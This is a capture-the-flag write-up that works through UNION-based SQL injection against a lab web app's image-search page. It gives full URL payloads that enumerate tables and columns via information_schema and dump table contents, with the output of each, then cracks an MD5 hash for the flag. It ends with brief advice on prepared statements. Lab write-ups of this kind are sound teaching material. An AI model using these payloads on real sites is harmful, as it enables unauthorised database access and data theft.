# Sql_Advanced_Injection

The GET parameter in the image search form is vulnerable to sql injection

## Method

Go to the search image page (<http://192.168.1.102/?page=searchimg>)  
In the search field search '1 and 1 = 1' (which shows you that the form is vulnerable)

## Manipulation

### getting the table name

```

http://192.168.1.102/?page=searchimg&id=-1 union select table_name, 0 from information_schema.tables where table_schema=database()&Submit=Submit

```

#### result

```

ID: -1 union select table_name, 0 from information_schema.tables where table_schema=database() 
Title: 0
Url : list_images

```

### getting the column names

```

http://192.168.1.102/?page=searchimg&id=-1 union select column_name, column_type from information_schema.columns where table_schema=database()&Submit=Submit

```

#### result

```

ID: -1 union select column_name, column_type from information_schema.columns where table_schema=database() 
Title: int(11)
Url : id
ID: -1 union select column_name, column_type from information_schema.columns where table_schema=database() 
Title: varchar(40)
Url : url
ID: -1 union select column_name, column_type from information_schema.columns where table_schema=database() 
Title: varchar(25)
Url : title
ID: -1 union select column_name, column_type from information_schema.columns where table_schema=database() 
Title: varchar(255)
Url : comment

```

### getting information we need

```

http://192.168.1.102/?page=searchimg&id=-1 union select title, comment from list_images&Submit=Submit

```

#### result

```

ID: -1 union select title, comment from list_images 
Title: An image about the NSA !
Url : Nsa
ID: -1 union select title, comment from list_images 
Title: There is a number..
Url : 42 !
ID: -1 union select title, comment from list_images 
Title: Google it !
Url : Google
ID: -1 union select title, comment from list_images 
Title: Yes we can !
Url : Obama
ID: -1 union select title, comment from list_images 
Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
Url : Hack me ?
ID: -1 union select title, comment from list_images 
Title: Because why not ?
Url : tr00l

```

You can see that it gives us this helpful part that says "If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"
We then follow this intruction to get the flag we need.

## How to get the flag

Decode the hash 1928e8083cf461a51303633093573c4 using md5.gromweb.com website.
Which gives us the original string "Albatroz"
lower all characters and as per the instructions Sh-256 of albatroz is: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188 which is the flag

## Prevention

>Everything has to be done through so-called prepared SQL queries, the ORMs do a good job of protecting info. (cf: PDO :: prepare)  
>Try sending forms as post requests
